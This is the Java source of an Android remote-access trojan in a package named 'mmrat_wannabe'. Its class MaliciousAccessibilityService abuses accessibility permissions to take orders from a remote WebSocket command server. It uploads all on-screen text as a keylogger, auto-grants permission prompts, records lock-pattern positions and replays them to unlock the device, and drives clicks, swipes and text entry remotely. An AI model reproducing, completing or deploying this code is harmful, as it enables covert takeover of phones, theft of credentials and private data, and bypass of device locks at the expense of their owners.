package com.example.mmrat_wannabe.services;

import static com.example.mmrat_wannabe.Config.BASE_URL;
import static com.example.mmrat_wannabe.Config.PORT;
import static com.example.mmrat_wannabe.Config.apiService;
import static com.example.mmrat_wannabe.Config.client;
import static com.example.mmrat_wannabe.GestureUtils.click;
import static com.example.mmrat_wannabe.GestureUtils.doubleClick;
import static com.example.mmrat_wannabe.GestureUtils.swipeDown;
import static com.example.mmrat_wannabe.GestureUtils.swipeLeft;
import static com.example.mmrat_wannabe.GestureUtils.swipeRight;
import static com.example.mmrat_wannabe.GestureUtils.swipeUp;
import static com.example.mmrat_wannabe.retrofit.RemoteWebSocketClient.wakeUpScreen;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Bundle;
import android.util.Log;
import android.util.Pair;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.example.mmrat_wannabe.R;
import com.example.mmrat_wannabe.SmallActivity;
import com.example.mmrat_wannabe.retrofit.RemoteWebSocketClient;

import java.io.IOException;
import java.security.KeyManagementException;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.util.ArrayList;
import java.util.List;

import okhttp3.Request;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MaliciousAccessibilityService extends AccessibilityService {
    private String[] command;
    RemoteWebSocketClient remoteWebSocketClient;
    private AccessibilityNodeInfo accessibilityNodeInfo;
    private List<Pair<Integer,Integer>> recordedEvents = new ArrayList<>();
    @Override
    public void onCreate() {
        super.onCreate();

        connectWebSocket();
    }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        if(!RemoteWebSocketClient.isConnected){
            connectWebSocket();
        }

        handleWebSocketCommands();

        handleScreenCapture();

        handlePermissionRequests(accessibilityEvent);

        recordPatternPosition(accessibilityEvent);

    }

    private void handleScreenCapture() {
        // Capture screen info also works as keylogger
        AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
        if (rootInActiveWindow != null) {
            accessibilityNodeInfo = rootInActiveWindow;
            uploadScreenData(printNodeInfo(rootInActiveWindow).toString());
            rootInActiveWindow.recycle(); // Release the AccessibilityNodeInfo object to avoid memory leaks
        }
    }

    private void handlePermissionRequests(AccessibilityEvent accessibilityEvent) {
        //Auto Grant Permissions
        try {
            if (!(accessibilityEvent.getClassName() == null || (getRootInActiveWindow()) == null || accessibilityEvent.getPackageName() == null)) {
                String charSequence = accessibilityEvent.getPackageName().toString();
                if (accessibilityEvent.getClassName().equals(("com.android.packageinstaller.permission.ui.GrantPermissionsActivity"))||charSequence.contains("com.google.android.packageinstaller")||charSequence.equals("com.google.android.packageinstaller")|| charSequence.equals("com.google.android.permissioncontroller")  || accessibilityEvent.getPackageName().toString().contains("com.google.android.permissioncontroller")) {
                    acceptPerms(accessibilityEvent);
                }
            }
        } catch (Exception e) {
            Log.d("Error", "Error Occurred");
        }
    }

    private void handleWebSocketCommands() {
        if (RemoteWebSocketClient.command != null) {
            SmallActivity.finishActivity();

            command = RemoteWebSocketClient.command.split(" ");
            // Execute the command...
            try {
                switch (command[0]) {
                    case "froze":
                        froze();
                        break;
                    case "unfroze":
                        unfroze();
                        break;
                    case "click":
                        click(this,command[1], command[2]);
                        break;
                    case "doubleclick":
                        doubleClick(this);
                        break;
                    case "swipeup":
                        swipeUp(this);
                        break;
                    case "swipedown":
                        swipeDown(this);
                        break;
                    case "swipeleft":
                        swipeLeft(this);
                        break;
                    case "swiperight":
                        swipeRight(this);
                        break;
                    case "clickon":
                        clickOn(command[1]);
                        break;
                    case "set":
                        setText(command[1],command[2]);
                        break;
                    case "home":
                        goHome();
                        break;
                    case "back":
                        goBack();
                        break;
                    case "unlock":
                        wakeUpScreen();
                        swipeUp(this);
                        Thread.sleep(1000);
                        replay(command[1]);
                        break;
                    default:
                        System.out.println("No such Command");
                        break;
                }
            }catch (IndexOutOfBoundsException e){
                System.out.println("Command incorrect");
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
            System.out.println("Command: "+ RemoteWebSocketClient.command);

            RemoteWebSocketClient.command = null;  // Clear the command after executing it
        }
    }

    private void froze() {
        AccessibilityServiceInfo info = getServiceInfo();
        info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
        setServiceInfo(info);
    }

    private void unfroze() {
        AccessibilityServiceInfo info = getServiceInfo();
        info.flags &= ~AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
        setServiceInfo(info);
    }

    private void goHome() {
        performGlobalAction(GLOBAL_ACTION_HOME);
    }

    private void goBack() {
        performGlobalAction(GLOBAL_ACTION_BACK);//dismiss the small activity
        performGlobalAction(GLOBAL_ACTION_BACK);
    }

    private void setText(String id, String text) {

        AccessibilityNodeInfo node = getNodeById(accessibilityNodeInfo,id);
        if(node!=null){
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            Bundle argument = new Bundle();
            argument.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT,argument);
        }

    }

    private void clickOn(String id) {
        //traverse to find the node with id
        AccessibilityNodeInfo node = getNodeById(accessibilityNodeInfo,id);
        if(node!=null){
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }

    }

    private void connectWebSocket() {

        try {
            remoteWebSocketClient = new RemoteWebSocketClient();

            Request request = new Request.Builder()
                    .url("ws://" + BASE_URL + ":" + PORT) // Replace with your WebSocket server URL
                    .build();

            client.newWebSocket(request, remoteWebSocketClient);

            RemoteWebSocketClient.isConnected = true;

        } catch (CertificateException e) {
            throw new RuntimeException(e);
        } catch (KeyStoreException e) {
            throw new RuntimeException(e);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (KeyManagementException e) {
            throw new RuntimeException(e);
        }

    }

    private AccessibilityNodeInfo getNodeById(AccessibilityNodeInfo node, String id) {
        if (node == null) {
            return null;
        }

        CharSequence widgetId = node.getViewIdResourceName();

        if (widgetId != null && widgetId.toString().equals(id)) {
            return node;
        }

        int childCount = node.getChildCount();

        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo childNode = node.getChild(i);
            AccessibilityNodeInfo foundNode = getNodeById(childNode, id);
            if (foundNode != null) {
                return foundNode;
            }
        }

        return null;
    }


    private StringBuilder printNodeInfo(AccessibilityNodeInfo node) {
        StringBuilder nodeInfoString = new StringBuilder();

        if (node == null) {
            return nodeInfoString;
        }

        CharSequence text = node.getText();
        CharSequence widgetId = node.getViewIdResourceName();
        boolean isClickable = node.isClickable();
        boolean canSetText = (node.getActions() & AccessibilityNodeInfo.ACTION_SET_TEXT) != 0;

        if (text != null && !text.toString().isEmpty()) {
            nodeInfoString.append("Text: ").append(text).append(" ");
        }

        if (widgetId != null && !widgetId.toString().isEmpty()) {
            nodeInfoString.append("Widget ID: ").append(widgetId).append(" ").append("Clickable: ").append(isClickable).append(" ").append("SetText: ").append(canSetText).append(" ");
        }

        int childCount = node.getChildCount();

        // Get the position of the widget
        Rect bounds = new Rect();
        node.getBoundsInScreen(bounds);
        // Calculate and append the center x and y coordinates
        int centerX = (bounds.left + bounds.right) / 2;
        int centerY = (bounds.top + bounds.bottom) / 2;
        nodeInfoString.append("Center X: ").append(centerX).append(" ");
        nodeInfoString.append("Center Y: ").append(centerY).append("\n");


        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo childNode = node.getChild(i);
            StringBuilder childNodeInfo = printNodeInfo(childNode);
            nodeInfoString.append(childNodeInfo);
        }

        return nodeInfoString;
    }

    private void uploadScreenData(String data) {
        if(data!=null) {
            Call<String> call = apiService.uploadScreenData(data);
            call.enqueue(new Callback<String>() {
                @Override
                public void onResponse(Call<String> call, Response<String> response) {
                    System.out.println(response.body());
                }

                @Override
                public void onFailure(Call<String> call, Throwable t) {
                    System.out.println("uploadScreenData: error");
                }
            });
        }
    }

    private void recordPatternPosition(AccessibilityEvent accessibilityEvent){
        if(accessibilityEvent.getPackageName()!=null && accessibilityEvent.getPackageName().equals("com.android.systemui")){
            AccessibilityNodeInfo node = accessibilityEvent.getSource();

            if(node!=null && node.getChildCount()==9 && node.getViewIdResourceName().equals("com.android.systemui:id/lockPatternView")){
                recordedEvents.clear();

                for(int i=0;i<node.getChildCount();i++) {
                    // Get the position of the widget
                    Rect bounds = new Rect();
                    node.getChild(i).getBoundsInScreen(bounds);
                    // Calculate and append the center x and y coordinates
                    int centerX = (bounds.left + bounds.right) / 2;
                    int centerY = (bounds.top + bounds.bottom) / 2;
                    recordedEvents.add(new Pair<Integer, Integer>(centerX, centerY));
                }
            }


        }
    }

    private void replay(String orders) {
        if (recordedEvents.isEmpty()) {
            return;
        }

        Path path = new Path();
        GestureDescription.Builder builder = new GestureDescription.Builder();

        for (char orderChar : orders.toCharArray()) {
            int index = Character.getNumericValue(orderChar);
            if (index >= 0 && index < recordedEvents.size()) {
                Pair<Integer, Integer> event = recordedEvents.get(index);
                if (path.isEmpty()) {
                    path.moveTo(event.first, event.second);
                } else {
                    path.lineTo(event.first, event.second);
                }
            }
        }

        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 500)); // Adjust duration as needed

        dispatchGesture(builder.build(), null, null);
    }


    private void acceptPerms(AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo permissionWindowNodeInfo = accessibilityEvent.getSource();

        String allowString = getString(R.string.allow_permission);
        String whileUsingAppString = getString(R.string.while_using_app);
        String doNotAllowString = getString(R.string.do_not_allow_permission);

        List<AccessibilityNodeInfo> list = permissionWindowNodeInfo.findAccessibilityNodeInfosByText(allowString);
        List<AccessibilityNodeInfo> list1 = permissionWindowNodeInfo.findAccessibilityNodeInfosByText(whileUsingAppString);
        list.addAll(list1);
        for (AccessibilityNodeInfo node : list) {
            if(node.isClickable() && !node.getText().equals(doNotAllowString)) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
        }
    }

    @Override
    public void onInterrupt() {

    }
}
